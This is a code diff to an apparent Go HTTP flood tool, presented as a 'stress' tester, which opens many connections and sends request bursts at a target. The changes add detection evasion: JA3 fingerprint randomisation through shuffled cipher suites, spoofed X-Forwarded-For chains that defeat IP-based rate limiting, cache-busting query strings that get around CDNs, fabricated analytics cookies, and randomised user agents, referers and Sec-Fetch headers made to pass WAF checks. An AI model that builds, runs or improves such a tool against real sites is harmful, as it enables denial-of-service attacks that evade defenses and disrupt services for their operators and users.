@@ -32,6 +32,7 @@ type StressConfig struct {
 	Path       string
 	ProxyType  string
 	Proxies    []string
+	JitterMs   int // max per-request jitter in milliseconds (0 = disabled)
 }
 
 // ─── HTTP helpers ─────────────────────────────────────────────────────────────
@@ -48,9 +49,50 @@ var (
 
 	languages = []string{
 		"en-US,en;q=0.9",
+		"en-US,en;q=0.9,fr;q=0.5",
 		"en-GB,en;q=0.8",
-		"fr-FR,fr;q=0.9,en-US;q=0.8",
-		"de-DE,de;q=0.9,en-US;q=0.8",
+		"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+		"de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
+		"es-ES,es;q=0.9,en;q=0.8",
+		"pt-BR,pt;q=0.9,en-US;q=0.8",
+		"ja-JP,ja;q=0.9,en-US;q=0.8",
+		"zh-CN,zh;q=0.9,en;q=0.8",
+		"ko-KR,ko;q=0.9,en-US;q=0.8",
+		"ru-RU,ru;q=0.9,en-US;q=0.8",
+		"tr-TR,tr;q=0.9,en-US;q=0.8",
+	}
+
+	// referers simulates real traffic sources including search engines and social media.
+	// An empty string means direct navigation (no Referer header).
+	referers = []string{
+		"https://www.google.com/",
+		"https://www.google.com/search?q=site",
+		"https://www.bing.com/search?q=",
+		"https://duckduckgo.com/",
+		"https://www.facebook.com/",
+		"https://t.co/",
+		"https://www.reddit.com/",
+		"https://www.youtube.com/",
+		"https://www.instagram.com/",
+		"https://www.linkedin.com/",
+		"https://news.ycombinator.com/",
+		"", // direct navigation — no Referer header
+		"", // weighted: ~17% chance of no referer
+	}
+
+	// chromeCipherSuites are the TLS 1.2 cipher suites Chrome offers.
+	// They are shuffled per-connection to vary the JA3 fingerprint.
+	chromeCipherSuites = []uint16{
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
 	}
 
 	// bufPool avoids per-request header allocations.
@@ -60,13 +102,13 @@ var (
 	// bodyBufPool avoids per-request POST body allocations.
 	bodyBufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}
 
-	// Pre-generated random User-Agent strings to avoid fmt.Sprintf per request.
+	// Pre-generated random User-Agent strings — large pool reduces repetition.
 	uaPool []string
 )
 
 func init() {
-	// Seed the UA pool with 100 random User-Agent strings.
-	uaPool = make([]string, 100)
+	// 500-entry pool with diverse browser/OS/mobile combinations.
+	uaPool = make([]string, 500)
 	for i := range uaPool {
 		uaPool[i] = generateUserAgent()
 	}
@@ -114,7 +156,7 @@ func (m *Manager) snapshotIPs() []string {
 
 // ─── Entry point ──────────────────────────────────────────────────────────────
 
-func runDirect(rawURL string, threads int, duration time.Duration, customHost string) {
+func runDirect(rawURL string, threads int, duration time.Duration, customHost string, jitterMs int) {
 	parsedURL, err := url.Parse(rawURL)
 	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
 		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
@@ -137,6 +179,7 @@ func runDirect(rawURL string, threads int, duration time.Duration, customHost st
 		CustomHost: customHost,
 		Port:       determinePort(parsedURL),
 		Path:       path,
+		JitterMs:   jitterMs,
 	}
 
 	// Initial DNS lookup.
@@ -275,16 +318,18 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)
 	backoff := 50 * time.Millisecond
 
-	// Shared TLS config — safe for concurrent use after initialisation.
-	//nolint:gosec // InsecureSkipVerify is intentional for a stress tool
-	tlsCfg := &tls.Config{
-		ServerName:         hostHdr,
-		InsecureSkipVerify: true,
-	}
-
 	for {
 		if ctx.Err() != nil {
 			return
+		}
+
+		// Build a fresh TLS config per-dial to shuffle cipher suites (JA3 variation).
+		//nolint:gosec // InsecureSkipVerify is intentional for a stress tool
+		tlsCfg := &tls.Config{
+			ServerName:         hostHdr,
+			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+			CipherSuites:       shuffledCipherSuites(),
 		}
 
 		conn, err := dialConn(ctx, addr, tlsCfg)
@@ -315,6 +360,16 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 				alive := m.sendBurst(conn, hostHdr, method)
 				if alive {
 					m.totalReqs.Add(1)
+					// Jitter: small random sleep between requests to avoid zero-delay bot signature.
+					if m.cfg.JitterMs > 0 {
+						jitter := time.Duration(rand.IntN(m.cfg.JitterMs)+1) * time.Millisecond
+						select {
+						case <-ctx.Done():
+							conn.Close()
+							return
+						case <-time.After(jitter):
+						}
+					}
 				} else {
 					m.totalErrors.Add(1)
 					conn.Close()
@@ -377,7 +432,7 @@ func (m *Manager) sendBurst(conn net.Conn, hostHdr, method string) (alive bool) 
 	return true
 }
 
-// buildRequest writes a raw HTTP/1.1 request into buf.
+// buildRequest writes a raw HTTP/1.1 request into buf using browser-realistic headers.
 // bodyBuf is populated only for POST.
 func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, bodyBuf *bytes.Buffer) {
 	hostPort := hostHdr
@@ -385,13 +440,26 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, b
 		hostPort = hostHdr + ":" + strconv.Itoa(cfg.Port)
 	}
 
-	// Determine the request URI.
+	// Determine request URI with a cache-busting parameter to defeat CDN caching
+	// and prevent rate-limiting based on repeated identical request signatures.
 	requestURI := cfg.Path
 	if cfg.ProxyType == "http" || cfg.ProxyType == "https" {
 		if cfg.Target.Scheme == "http" {
 			requestURI = cfg.Target.String()
 		}
 	}
+	if method == "GET" || method == "HEAD" {
+		if strings.Contains(requestURI, "?") {
+			requestURI += "&" + randomCacheBuster()
+		} else {
+			requestURI += "?" + randomCacheBuster()
+		}
+	}
+
+	ua := randomUserAgent()
+	isMobile := strings.Contains(ua, "Mobile")
+	isChrome := strings.Contains(ua, "Chrome/")
+	isFirefox := strings.Contains(ua, "Firefox/")
 
 	buf.WriteString(method)
 	buf.WriteByte(' ')
@@ -400,43 +468,101 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, b
 	buf.WriteString(hostPort)
 	buf.WriteString("\r\n")
 
-	ua := randomUserAgent()
 	buf.WriteString("User-Agent: " + ua + "\r\n")
-	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
-	buf.WriteString("Accept-Language: " + languages[rand.IntN(len(languages))] + "\r\n")
-	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
-	buf.WriteString("DNT: 1\r\n")
 
-	// sec-ch-ua is a Chrome-only header; real Firefox never sends it.
-	if isChromeUA(ua) {
-		cv := randomChromeVersion()
-		buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
-		buf.WriteString(cv)
-		buf.WriteString("\", \"Chromium\";v=\"")
-		buf.WriteString(cv)
-		buf.WriteString("\", \";Not A Brand\";v=\"99\"\r\n")
-		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
-		buf.WriteString("sec-ch-ua-platform: \"")
-		buf.WriteString(randomPlatform())
-		buf.WriteString("\"\r\n")
+	// Browser-specific Accept strings (WAFs check UA ↔ Accept consistency).
+	switch {
+	case isFirefox:
+		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n")
+	case isChrome:
+		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n")
+	default: // Safari
+		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
 	}
 
-	buf.WriteString("Sec-Fetch-Site: none\r\n")
-	buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
-	buf.WriteString("Sec-Fetch-User: ?1\r\n")
-	buf.WriteString("Sec-Fetch-Dest: document\r\n")
-	buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
-	buf.WriteString("Cache-Control: no-cache\r\n")
-	// X-Forwarded-For spoofing: defeats IP-based rate limiting on the target.
+	buf.WriteString("Accept-Language: " + languages[rand.IntN(len(languages))] + "\r\n")
+	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
+
+	// sec-ch-ua: Chrome-only client hint headers.
+	if isChrome {
+		cv := randomChromeVersion()
+		if isMobile {
+			buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
+			buf.WriteString(cv)
+			buf.WriteString("\", \"Chromium\";v=\"")
+			buf.WriteString(cv)
+			buf.WriteString("\", \"Not:A-Brand\";v=\"24\"\r\n")
+			buf.WriteString("sec-ch-ua-mobile: ?1\r\n")
+			buf.WriteString("sec-ch-ua-platform: \"Android\"\r\n")
+		} else {
+			buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
+			buf.WriteString(cv)
+			buf.WriteString("\", \"Chromium\";v=\"")
+			buf.WriteString(cv)
+			buf.WriteString("\", \"Not:A-Brand\";v=\"24\"\r\n")
+			buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
+			buf.WriteString("sec-ch-ua-platform: \"")
+			buf.WriteString(randomPlatform())
+			buf.WriteString("\"\r\n")
+		}
+	}
+
+	// Sec-Fetch-* headers: vary site/mode to look like diverse navigation events,
+	// not a bot sending Sec-Fetch-Site: none on every single request.
+	secFetchSites := []string{"none", "same-origin", "same-site", "cross-site"}
+	secFetchSite := secFetchSites[rand.IntN(len(secFetchSites))]
+
+	if isChrome || isFirefox {
+		buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
+		buf.WriteString("Sec-Fetch-Site: " + secFetchSite + "\r\n")
+		buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
+		if secFetchSite == "none" || secFetchSite == "same-origin" {
+			buf.WriteString("Sec-Fetch-User: ?1\r\n")
+		}
+		buf.WriteString("Sec-Fetch-Dest: document\r\n")
+	}
+
+	// Priority header: Chrome 115+ sends this on document navigations.
+	if isChrome {
+		buf.WriteString("Priority: u=0, i\r\n")
+	}
+
+	buf.WriteString("Cache-Control: no-cache, no-store\r\n")
+	buf.WriteString("Pragma: no-cache\r\n")
+
+	// X-Forwarded-For chain: simulate CDN-proxied traffic with 2-hop or 3-hop chain.
 	buf.WriteString("X-Forwarded-For: ")
-	buf.WriteString(strconv.Itoa(rand.IntN(256)))
-	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rand.IntN(256)))
-	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rand.IntN(256)))
-	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rand.IntN(256)))
+	buf.WriteString(randomPublicIP())
+	if rand.IntN(3) > 0 { // 66% chance of multi-hop chain
+		buf.WriteString(", ")
+		buf.WriteString(randomCDNEdgeIP())
+	}
 	buf.WriteString("\r\n")
+
+	// Cookie simulation: ~20% chance of analytics cookies (returning visitor pattern).
+	if rand.IntN(5) == 0 {
+		gaBase := rand.Int64N(1_999_999_999) + 1
+		gaStamp := time.Now().Unix() - rand.Int64N(90*24*3600) // random visit up to 90 days ago
+		gidBase := rand.Int64N(1_999_999_999) + 1
+		buf.WriteString("Cookie: _ga=GA1.2.")
+		buf.WriteString(strconv.FormatInt(gaBase, 10))
+		buf.WriteByte('.')
+		buf.WriteString(strconv.FormatInt(gaStamp, 10))
+		buf.WriteString("; _gid=GA1.2.")
+		buf.WriteString(strconv.FormatInt(gidBase, 10))
+		buf.WriteByte('.')
+		buf.WriteString(strconv.FormatInt(time.Now().Unix(), 10))
+		buf.WriteString("\r\n")
+	}
+
+	// Referer: diverse sources including search engines and social media.
+	// ~17% of requests have no referer (direct navigation).
+	referer := referers[rand.IntN(len(referers))]
+	if referer != "" {
+		buf.WriteString("Referer: ")
+		buf.WriteString(referer)
+		buf.WriteString("\r\n")
+	}
 
 	if method == "POST" {
 		ct := contentTypes[rand.IntN(len(contentTypes))]
@@ -446,13 +572,12 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, b
 		buf.WriteString("\r\nContent-Length: ")
 		buf.WriteString(strconv.Itoa(bodyBuf.Len()))
 		buf.WriteString("\r\n")
+		buf.WriteString("Origin: https://")
+		buf.WriteString(hostHdr)
+		buf.WriteString("\r\n")
 	}
 
-	buf.WriteString("Referer: https://")
-	buf.WriteString(hostHdr)
-	buf.WriteString("/\r\nOrigin: https://")
-	buf.WriteString(hostHdr)
-	buf.WriteString("\r\nConnection: keep-alive\r\n\r\n")
+	buf.WriteString("Connection: keep-alive\r\n\r\n")
 }
 
 // ─── DNS ──────────────────────────────────────────────────────────────────────
@@ -529,10 +654,11 @@ func lookupIPv4(host string) ([]string, error) {
 // TLS uses tls.Dialer.DialContext so the dial respects ctx cancellation.
 func dialConn(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
 	netDialer := &net.Dialer{
-		Timeout:   3 * time.Second,
+		Timeout:   5 * time.Second,
 		KeepAlive: 30 * time.Second,
 	}
-	if strings.HasSuffix(addr, ":443") {
+	_, port, _ := net.SplitHostPort(addr)
+	if port == "443" || tlsCfg != nil && strings.HasSuffix(addr, ":443") {
 		// tls.Dialer.DialContext honours ctx cancellation, unlike tls.DialWithDialer.
 		return (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
 	}
@@ -573,32 +699,146 @@ func randomUserAgent() string {
 	return uaPool[rand.IntN(len(uaPool))]
 }
 
+// generateUserAgent produces a realistic UA from one of five browser/platform families.
 func generateUserAgent() string {
-	osList := []string{
-		"Windows NT 10.0; Win64; x64",
-		"Macintosh; Intel Mac OS X 10_15_7",
-		"X11; Linux x86_64",
+	switch rand.IntN(10) {
+	case 0, 1, 2, 3, 4: // 50% Chrome desktop
+		return generateChromeDesktopUA()
+	case 5, 6: // 20% Firefox desktop
+		return generateFirefoxDesktopUA()
+	case 7: // 10% Safari macOS
+		return generateSafariDesktopUA()
+	case 8: // 10% Chrome Android
+		return generateChromeAndroidUA()
+	default: // 10% Safari iOS
+		return generateSafariIOSUA()
 	}
-	os := osList[rand.IntN(len(osList))]
-	if rand.IntN(2) == 0 {
-		v := fmt.Sprintf("%d.0.%d.%d", rand.IntN(30)+90, rand.IntN(4000), rand.IntN(200))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
-	}
-	major := rand.IntN(30) + 70
-	minor := rand.IntN(10)
-	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.%d", os, major, major, minor)
 }
 
-func isChromeUA(ua string) bool {
-	return strings.Contains(ua, "Chrome/")
+func generateChromeDesktopUA() string {
+	osList := []string{
+		"Windows NT 10.0; Win64; x64",
+		"Windows NT 11.0; Win64; x64",
+		"Macintosh; Intel Mac OS X 10_15_7",
+		"Macintosh; Intel Mac OS X 13_0_0",
+		"Macintosh; Intel Mac OS X 14_0",
+		"X11; Linux x86_64",
+		"X11; Linux i686",
+	}
+	os := osList[rand.IntN(len(osList))]
+	major := rand.IntN(20) + 110 // v110–v130
+	build := rand.IntN(5000) + 1000
+	patch := rand.IntN(200)
+	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
+		os, major, build, patch)
+}
+
+func generateFirefoxDesktopUA() string {
+	osList := []string{
+		"Windows NT 10.0; Win64; x64",
+		"Windows NT 11.0; Win64; x64",
+		"Macintosh; Intel Mac OS X 10.15",
+		"X11; Linux x86_64",
+		"X11; Ubuntu; Linux x86_64",
+	}
+	os := osList[rand.IntN(len(osList))]
+	major := rand.IntN(30) + 100 // v100–v130
+	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, major, major)
+}
+
+func generateSafariDesktopUA() string {
+	macVersions := []string{"10_15_7", "12_0_0", "13_0_0", "14_0", "14_1_2"}
+	safariBuilds := []string{"605.1.15", "614.1", "615.1.7", "616.2.9", "617.3.11"}
+	mac := macVersions[rand.IntN(len(macVersions))]
+	sb := safariBuilds[rand.IntN(len(safariBuilds))]
+	return fmt.Sprintf("Mozilla/5.0 (Macintosh; Intel Mac OS X %s) AppleWebKit/%s (KHTML, like Gecko) Version/16.%d Safari/%s",
+		mac, sb, rand.IntN(6), sb)
+}
+
+func generateChromeAndroidUA() string {
+	devices := []string{
+		"Linux; Android 13; SM-G991B",
+		"Linux; Android 14; Pixel 8",
+		"Linux; Android 13; Pixel 7",
+		"Linux; Android 12; SM-A525F",
+		"Linux; Android 14; SM-S918B",
+		"Linux; Android 13; CPH2197",
+	}
+	device := devices[rand.IntN(len(devices))]
+	major := rand.IntN(15) + 115 // v115–v130
+	build := rand.IntN(5000) + 1000
+	patch := rand.IntN(200)
+	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Mobile Safari/537.36",
+		device, major, build, patch)
+}
+
+func generateSafariIOSUA() string {
+	versions := []string{
+		"iPhone; CPU iPhone OS 16_6 like Mac OS X",
+		"iPhone; CPU iPhone OS 17_0 like Mac OS X",
+		"iPhone; CPU iPhone OS 17_2 like Mac OS X",
+		"iPad; CPU OS 16_6 like Mac OS X",
+		"iPad; CPU OS 17_0 like Mac OS X",
+	}
+	builds := []string{"604.1", "605.1.15", "614.1"}
+	v := versions[rand.IntN(len(versions))]
+	sb := builds[rand.IntN(len(builds))]
+	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/16.%d Mobile/15E148 Safari/%s",
+		v, sb, rand.IntN(6), sb)
 }
 
 func randomChromeVersion() string {
-	return strconv.Itoa(rand.IntN(30) + 90)
+	return strconv.Itoa(rand.IntN(20) + 110) // v110–v130
 }
 
 func randomPlatform() string {
 	return []string{"Windows", "macOS", "Linux"}[rand.IntN(3)]
+}
+
+// randomCacheBuster returns a random query key=value pair to defeat caching and
+// prevent rate-limiting systems from collapsing repeated identical request signatures.
+func randomCacheBuster() string {
+	keys := []string{"_", "v", "cb", "t", "r", "nocache", "ts", "rnd"}
+	return keys[rand.IntN(len(keys))] + "=" + strconv.FormatInt(rand.Int64N(1_000_000_000), 10)
+}
+
+// randomPublicIP returns a random routable IPv4 address (non-RFC1918).
+func randomPublicIP() string {
+	for {
+		a := rand.IntN(222) + 1
+		if a == 10 || a == 127 {
+			continue
+		}
+		b := rand.IntN(256)
+		if a == 172 && b >= 16 && b <= 31 {
+			continue
+		}
+		if a == 192 && b == 168 {
+			continue
+		}
+		return fmt.Sprintf("%d.%d.%d.%d", a, b, rand.IntN(256), rand.IntN(254)+1)
+	}
+}
+
+// randomCDNEdgeIP simulates an intermediate CDN/load-balancer hop in the XFF chain.
+func randomCDNEdgeIP() string {
+	switch rand.IntN(3) {
+	case 0:
+		return fmt.Sprintf("10.%d.%d.%d", rand.IntN(256), rand.IntN(256), rand.IntN(254)+1)
+	case 1:
+		return fmt.Sprintf("172.%d.%d.%d", rand.IntN(16)+16, rand.IntN(256), rand.IntN(254)+1)
+	default:
+		return fmt.Sprintf("192.168.%d.%d", rand.IntN(256), rand.IntN(254)+1)
+	}
+}
+
+// shuffledCipherSuites returns a copy of the browser cipher suite list in a randomised
+// order. This varies the JA3 TLS fingerprint on each new connection.
+func shuffledCipherSuites() []uint16 {
+	suites := make([]uint16, len(chromeCipherSuites))
+	copy(suites, chromeCipherSuites)
+	rand.Shuffle(len(suites), func(i, j int) { suites[i], suites[j] = suites[j], suites[i] })
+	return suites
 }
 
 func randomString(n int) string {
